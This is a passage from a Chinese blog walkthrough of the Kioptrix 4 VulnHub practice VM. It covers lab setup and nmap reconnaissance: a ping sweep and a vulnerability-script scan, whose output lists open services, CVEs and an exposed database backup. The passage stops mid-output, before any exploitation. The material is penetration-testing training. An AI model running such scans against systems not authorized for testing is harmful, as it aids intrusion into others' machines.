<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="介绍名称：Kioptrix: Level 1.3 (#4)发布日期：2012年2月8日 下载链接:Kioptrix4_vmware.rar (Size: 208 MB)Download: http:&#x2F;&#x2F;www.kioptrix.com&#x2F;dlvm&#x2F;Kioptrix4_vmware.rarDownload(Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;kioptrix&#x2F;K">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub靶机渗透[Kioptrix4]">
<meta property="og:url" content="https://fdlucifer.github.io/2019/12/10/Kioptrix4/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="介绍名称：Kioptrix: Level 1.3 (#4)发布日期：2012年2月8日 下载链接:Kioptrix4_vmware.rar (Size: 208 MB)Download: http:&#x2F;&#x2F;www.kioptrix.com&#x2F;dlvm&#x2F;Kioptrix4_vmware.rarDownload(Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;kioptrix&#x2F;K">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub32.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub33.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub34.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub35.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub36.jpg">
<meta property="article:published_time" content="2019-12-10T02:01:29.000Z">
<meta property="article:modified_time" content="2020-08-16T16:53:44.167Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="vulnhub靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub32.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2019/12/10/Kioptrix4/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2019/12/10/Kioptrix4/","path":"2019/12/10/Kioptrix4/","title":"vulnhub靶机渗透[Kioptrix4]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>vulnhub靶机渗透[Kioptrix4] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="lUc1f3r11's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">虚拟机与网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BB%85%E6%88%AA%E5%8F%96%E5%85%B3%E9%94%AE%E9%83%A8%E5%88%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集(仅截取关键部分)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="nav-number">3.</span> <span class="nav-text">获取root权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">其它方法</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">203</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2019/12/10/Kioptrix4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="vulnhub靶机渗透[Kioptrix4] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          vulnhub靶机渗透[Kioptrix4]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-12-10 10:01:29" itemprop="dateCreated datePublished" datetime="2019-12-10T10:01:29+08:00">2019-12-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2020-08-17 00:53:44" itemprop="dateModified" datetime="2020-08-17T00:53:44+08:00">2020-08-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>7.1k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>26 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>名称：Kioptrix: Level 1.3 (#4)<br>发布日期：2012年2月8日</p>
<p>下载链接:<br>Kioptrix4_vmware.rar (Size: 208 MB)<br>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5raW9wdHJpeC5jb20vZGx2bS9LaW9wdHJpeDRfdm13YXJlLnJhcg==">http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar<i class="fa fa-external-link-alt"></i></span><br>Download(Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LaW9wdHJpeDRfdm13YXJlLnJhcg==">https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar<i class="fa fa-external-link-alt"></i></span><br>Download(Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LaW9wdHJpeDRfdm13YXJlLnJhci50b3JyZW50">https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar.torrent<i class="fa fa-external-link-alt"></i></span></p>
<p>虚拟机之间再次存在很长的延迟，但这无济于事。 工作，家庭必须是第一位的。 博客和兴趣爱好排在列表的下方。 这些事情并不像人们想象的那么容易。 必须为这些挑战投入时间和一些计划，以确保：</p>
<span id="more"></span>

<p>1.可以远程获得root权限[编辑：对不起，我的意思不是]</p>
<p>1a. 可以远程破坏机器</p>
<ul>
<li>1.停留在此网站的目标受众范围内</li>
<li>2.必须是“现实的”（好吧……）</li>
<li>3.应该为我复习。 无论是PHP还是MySQL用法等等。我已经有一段时间没做过了。</li>
</ul>
<p>我也很难导出这个。 因此，请花时间阅读本文结尾处的评论。</p>
<p>秉承事物的精神，这一挑战与其他挑战有所不同，但仍处于轻松的境界。 我知道自己重复一遍，但必须始终清楚：这些VM是针对初学者的。 这是一个起点。</p>
<p>我很想编写一些小型的自定义应用程序，以供人们使用。 但我是管理员，不是编码员。 学习&#x2F;编码这样的应用程序将花费太多时间。 并不是说我永远不会尝试做一个，但我不会屏住呼吸。 如果有人想要更艰巨的挑战，我敢肯定，Inter-tube会将他们抱在某个地方。 或者，您也可以随时注册Offsec的PWB课程。无耻的插头</p>
<p>– 我必须说几件事。 我使用新平台制作了这张图片。 希望一切正常，但我无法测试所有内容。 最初，VM在启动时很难获得IP。 由于某种原因，NIC无法启动，并且机器留有环回接口。 我希望我解决了这个问题。 如果这个启动需要一点时间，请不要感到惊讶。 它正在尝试获取IP。 有点耐心。 有人为我测试了映像，还报告说VM开机后就挂了。 重新启动后一切都很好。 只有一个人报告了此消息，因此希望这不是主要问题。 如果计划在vmFusion上运行它，则可能需要转换想象以适合您的融合版本。<br>– 还为使用Hyper-V的用户添加了VHD文件以供下载。 你们可能需要将网络适配器更改为“旧版网络适配器”。 我已经对该文件进行了测试，这个文件似乎对我来说还算不错…如果您遇到问题，或者由于某种原因它无法正常工作，请发送电子邮件comms [&#x3D;]kioptrix.com</p>
<p>感谢<span class="exturl" data-url="aHR0cDovL3d3dy5uMDBicGVudGVzdGluZy5jb20lRTQlQjglOEElRTclOUElODRAc2hhaV9zYWludOS9v+eUqOWQhOenjXZt6Kej5Yaz5pa55qGI6L+b6KGM5oCl6ZyA55qE5rWL6K+VLi8=">www.n00bpentesting.com上的@shai_saint使用各种VM解决方案进行急需的测试。<i class="fa fa-external-link-alt"></i></span></p>
<p>感谢Hackfest.ca的Patrick也运行了VM并报告了一些问题。 Swappage和@Tallenz也这样做。 所有的帮助都是感激的家伙</p>
<p>所以我希望你喜欢这个。</p>
<p>Kioptrix团队</p>
<p>Note:只是一个虚拟硬盘。 您需要创建一个新的虚拟机并附加现有的硬盘驱动器.</p>
<p>运行服务:</p>
<ul>
<li>Apache</li>
<li>MySQL</li>
<li>OpenSSH</li>
<li>PHP</li>
<li>Samba</li>
</ul>
<p>漏洞知识点:</p>
<ul>
<li>文件包含</li>
<li>操作系统命令注入</li>
<li>权限提升</li>
<li>特权不正确的服务</li>
<li>SQL注入</li>
</ul>
<h3 id="虚拟机与网络配置"><a href="#虚拟机与网络配置" class="headerlink" title="虚拟机与网络配置"></a>虚拟机与网络配置</h3><p>点击vmware新建虚拟机，选择ubuntu,接下来的配置，除了下图配置与平常不同，其他步骤均与平常相同</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub32.jpg"></p>
<p>.vmdk文件为压缩包中解压出的文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub33.jpg"></p>
<p>将虚拟靶机和kali攻击机的vmware网络都配置成[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]即可。</p>
<h4 id="信息收集-仅截取关键部分"><a href="#信息收集-仅截取关键部分" class="headerlink" title="信息收集(仅截取关键部分)"></a>信息收集(仅截取关键部分)</h4><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.136 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.137 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.138 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.139</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">MAC Address: 00:0C:29:F3:0E:E9 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.140 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.141 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.143 [host down]</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.139</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">Scanning 192.168.84.139 [1000 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 80/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 22/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 445/tcp on 192.168.84.139</span><br><span class="line">Completed SYN Stealth Scan at 20:57, 2.09s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 20:57</span><br><span class="line">Scanning 4 services on 192.168.84.139</span><br><span class="line">Completed Service scan at 20:57, 11.02s elapsed (4 services on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against 192.168.84.139</span></span><br><span class="line">NSE: Script scanning 192.168.84.139.</span><br><span class="line">Initiating NSE at 20:57</span><br><span class="line">Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE: Active NSE Script Threads: 3 (3 waiting)</span><br><span class="line">NSE Timing: About 99.42% <span class="keyword">done</span>; ETC: 20:59 (0:00:01 remaining)</span><br><span class="line">Completed NSE at 21:02, 311.88s elapsed</span><br><span class="line">Initiating NSE at 21:02</span><br><span class="line">Completed NSE at 21:02, 0.12s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.139</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.7p1: </span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span>.<span class="number">84.139</span></span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.139</span>:<span class="number">80</span>/</span><br><span class="line">|     Form id: myusername</span><br><span class="line">|     Form action: checklogin.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.139</span>:<span class="number">80</span>/checklogin.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: index.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.139</span>:<span class="number">80</span>/index.php</span><br><span class="line">|     Form id: myusername</span><br><span class="line">|_    Form action: checklogin.php</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /database.sql: Possible database backup</span><br><span class="line">|   /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|   /images/: Potentially interesting directory w/ listing on &#x27;apache/<span class="number">2.2</span>.<span class="number">8</span> (ubuntu) php/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with suhosin-patch&#x27;</span><br><span class="line">|_  /index/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.2</span>.<span class="number">8</span> (Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   